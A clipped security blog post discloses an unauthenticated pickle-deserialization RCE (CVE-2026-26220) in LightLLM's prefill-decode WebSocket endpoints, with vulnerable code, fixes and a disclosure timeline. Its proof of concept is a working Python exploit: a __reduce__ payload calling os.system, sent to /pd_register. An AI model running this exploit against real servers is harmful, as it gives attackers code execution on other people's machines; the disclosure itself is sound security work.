---
title: "LightLLM: Unauthenticated RCE via Pickle Deserialization in WebSocket Endpoints - Chocapikk's Cybersecurity Blog"
source: https://chocapikk.com/posts/2026/lightllm-pickle-rce/
source_host: chocapikk.com
clip_date: 2026-09-24T10:31:00+08:00
trace_id: fb11d6ba-931d-4959-baa5-64c98a75beea
content_hash: f569c0c3ac4a1994935f63163004de2ab4b6517361ca70d6c13be47fd90a86b8
status: synced
tags:
  - 漏洞分析
  - AI应用
series: null
feed_source: Chocapikk·漏洞/Android RE
ai_summary: LightLLM 的 PD 分离架构 master 节点在 `/pd_register` 与 `/kv_move_status` 两个 WebSocket 端点对二进制帧直接调用 `pickle.loads()` 且无任何认证，可被网络内任意主机利用实现远程代码执行（CVE-2026-26220，CVSS 9.3）。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3e575244-d011-8136-85cd-f3dd873d702c
ioc:
  cves:
    - CVE-2025-32444
    - CVE-2026-26220
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> LightLLM 的 PD 分离架构 master 节点在 `/pd_register` 与 `/kv_move_status` 两个 WebSocket 端点对二进制帧直接调用 `pickle.loads()` 且无任何认证，可被网络内任意主机利用实现远程代码执行（CVE-2026-26220，CVSS 9.3）。
> 
> - **漏洞点：** `lightllm/server/api_http.py` 第 310、331 行，以及 worker 侧 `pd_loop.py` 第 105、186 行，共四处对不可信 WebSocket 数据调用 `pickle.loads()`。
> - **强制暴露：** 启动代码含 `assert manager.args.host not in ["127.0.0.1", "localhost"]`，PD master 按设计无法绑定本地回环，不存在安全的部署配置。
> - **认证缺失：** `/pd_register` 需先发 JSON 注册帧（node_id 为无校验整数，mode 仅做字符串枚举检查），随后循环读取 pickle；`/kv_move_status` 首个二进制帧即反序列化，连注册步骤都不需要。
> - **利用方式：** 构造 `__reduce__` 返回 `os.system` 的类，连接 `ws://target:8000/pd_register` 先发注册 JSON 再发 pickle，命令在反序列化时即执行，服务端随后报错也不影响。
> - **修复与背景：** 建议改用 JSON/MessagePack、为 WebSocket 加鉴权、或使用带白名单的 `RestrictedUnpickler`；该项目自 2025 年 3 月的 ZMQ 反序列化报告（issue #784）起近一年未修，同类问题在 vLLM 中已获 CVE-2025-32444（CVSS 10.0）。

## Introduction

During my audit of pickle deserialization vulnerabilities in ML inference frameworks, I found a critical RCE in **LightLLM**, an LLM (Large Language Model) inference engine with 3,890 stars.

This is distinct from the existing ZMQ report on the project ([issue #784](https://github.com/ModelTC/LightLLM/issues/784)). What I found are WebSocket endpoints in the PD (prefill-decode) disaggregation system that call `pickle.loads()` on binary WebSocket frames with no authentication. The server code even has an assertion that explicitly prevents binding to localhost - these endpoints are always network-exposed by design.

**CVE:** [CVE-2026-26220](https://www.cve.org/CVERecord?id=CVE-2026-26220) **Target:** [ModelTC/lightllm](https://github.com/ModelTC/lightllm) **Stars:** 3,890 **Severity:** Critical (CVSS 4.0: 9.3)

## What is LightLLM?

LightLLM is a Python-based LLM inference framework focused on large-scale deployment. It supports prefill-decode (PD) disaggregation, where the prefill phase (processing the input prompt) and decode phase (generating tokens) run on separate GPU nodes to optimize throughput.

In PD mode, a master node orchestrates worker registration and KV-cache transfers between prefill and decode nodes. Workers connect to the master via WebSocket to register themselves and report status. This communication layer is where the vulnerability lives.

## The Vulnerability

The PD master server in `lightllm/server/api_http.py` exposes two WebSocket endpoints that deserialize incoming binary data with `pickle.loads()`.

**`/pd_register`** at [line 310](https://github.com/ModelTC/lightllm/blob/a27dfc88c2144ed51a6e160b6fbe20aad66c8fe0/lightllm/server/api_http.py#L310):

```python
# Worker registration endpoint
data = await websocket.receive_bytes()
obj = pickle.loads(data)  # untrusted WebSocket binary frame
```

**`/kv_move_status`** at [line 331](https://github.com/ModelTC/lightllm/blob/a27dfc88c2144ed51a6e160b6fbe20aad66c8fe0/lightllm/server/api_http.py#L331):

```python
# KV-cache transfer status endpoint
data = await websocket.receive_bytes()
upkv_status = pickle.loads(data)  # same pattern
```

There are also two more `pickle.loads()` calls in the worker-side PD loop at `lightllm/server/httpserver/pd_loop.py` (lines 105 and 186).

### Always Network-Exposed

Here’s the interesting part. The PD master startup code has this assertion:

```python
assert manager.args.host not in ["127.0.0.1", "localhost"]
```

**The server explicitly refuses to bind to localhost.** In PD mode, the server is always exposed on a routable interface. This isn’t a misconfiguration - it’s by design, because the whole point is that remote workers need to connect.

### The /pd_register Protocol

The `/pd_register` endpoint has a two-step protocol:

1.  First, it expects a JSON text frame with worker registration data (node_id, IP, mode, etc.)
2.  Then it enters a loop reading binary frames and passing them to `pickle.loads()`

The registration step does no authentication. The `node_id` is just an integer with no validation against an allowlist - any value works. The `mode` must be one of `["prefill", "decode", "nixl_prefill", "nixl_decode"]`, but that’s just a string check, not auth.

The `/kv_move_status` endpoint is simpler - it accepts pickle directly on the first binary frame, no registration step needed.

## Proof of Concept

### The Exploit

```python
import pickle, os, json, asyncio, websockets

class RCE:
    def __reduce__(self):
        return (os.system, ('id > /tmp/lightllm_pwned',))

async def exploit():
    async with websockets.connect('ws://target:8000/pd_register') as ws:
        # Step 1: Send JSON registration (required by protocol)
        await ws.send(json.dumps({
            "node_id": 9999,
            "client_ip_port": "127.0.0.1:9999",
            "mode": "prefill",
            "start_args": {},
        }))
        # Step 2: Send malicious pickle binary frame
        await ws.send(pickle.dumps(RCE()))

asyncio.run(exploit())
```

### Result

```plaintext
$ cat /tmp/lightllm_pwned
uid=1000(chocapikk) gid=1001(chocapikk) groups=1001(chocapikk),4(adm),24(cdrom),27(sudo),...
```

The pickle payload executes during deserialization, before any further processing. The server may crash or log an error, but the command has already run.

### Note on GPU Requirement

The `pickle.loads()` calls execute during WebSocket message handling, before any GPU inference. However, the LightLLM API server requires a model loaded on GPU to complete startup, so a machine with an NVIDIA GPU is needed to reproduce the full attack chain.

## Prior Disclosure

This project has a pattern of ignoring security reports:

-   **[Issue #784](https://github.com/ModelTC/LightLLM/issues/784)** (March 2025): Filed by [kexinoh](https://github.com/kexinoh), reporting ZMQ `recv_pyobj()` deserialization in multi-node mode. A maintainer responded “we will try to fix this soon” - **still unfixed 11 months later.** No CVE assigned.
-   **[Issue #1102](https://github.com/ModelTC/LightLLM/issues/1102)** (November 2025): [Chenpinji](https://github.com/Chenpinji) reported that their private security report submitted via GitHub Security got no response - the maintainer said they “missed the notification.”

The WebSocket vulnerabilities I’m reporting (`/pd_register`, `/kv_move_status`) are a different attack surface from the ZMQ `recv_pyobj()` issue in #784. The identical vulnerability class in vLLM received [CVE-2025-32444](https://nvd.nist.gov/vuln/detail/CVE-2025-32444) (CVSS 10.0).

## Attack Surface

In a typical multi-node production deployment (documented in the project’s test scripts):

```bash
# Node 1: PD master - exposes WebSocket endpoints
python -m lightllm.server.api_server \
    --model_dir /path/to/model \
    --run_mode pd_master \
    --host 10.0.0.1 --port 60011

# Node 2: Prefill worker
python -m lightllm.server.api_server \
    --model_dir /path/to/model \
    --run_mode prefill \
    --host 10.0.0.2 --port 8019 \
    --pd_master_ip 10.0.0.1 --pd_master_port 60011
```

Any host on the network can connect to `ws://10.0.0.1:60011/pd_register` and achieve RCE. **There’s no authentication at any layer.**

## Suggested Fix

1.  **Replace `pickle.loads()` with JSON or MessagePack** for WebSocket communication. Worker registration data is simple structured data - strings, ints, dicts. KV-cache status updates are similarly straightforward. Neither needs pickle.
2.  **Add authentication to WebSocket endpoints.** Token-based auth, TLS client certificates, or even a shared secret would prevent unauthenticated connections.
3.  **If pickle is required, use a `RestrictedUnpickler`** with an explicit allowlist of safe classes.

## Timeline

-   **2025-03:** [Issue #784](https://github.com/ModelTC/LightLLM/issues/784) filed by [kexinoh](https://github.com/kexinoh) for ZMQ deserialization (unfixed)
-   **2025-11:** [Issue #1102](https://github.com/ModelTC/LightLLM/issues/1102) - [Chenpinji](https://github.com/Chenpinji) ’s private security report got no response
-   **2026-02-11:** WebSocket vulnerabilities discovered and confirmed by code audit
-   **2026-02-11:** CVE request submitted to VulnCheck
-   **2026-02-12:** CVE-2026-26220 assigned by VulnCheck
-   **2026-02-15:** Public disclosure via GitHub issue

## Takeaways

LightLLM is actively maintained (daily commits as of February 2026) but has systematically ignored security reports for nearly a year. [Issue #784](https://github.com/ModelTC/LightLLM/issues/784) got a “we will try to fix this soon” response in March 2025 and nothing has changed. When the identical vulnerability class in a peer project (vLLM) gets [CVE-2025-32444](https://nvd.nist.gov/vuln/detail/CVE-2025-32444) with CVSS 10.0, that’s a signal the issue is critical.

The broader pattern here is disaggregated serving creating new attack surfaces that didn’t exist in single-node deployments. Every node-to-node communication channel that uses pickle is a potential RCE vector, and the code forcing network exposure (the localhost assertion) means there’s no safe deployment configuration for PD mode.
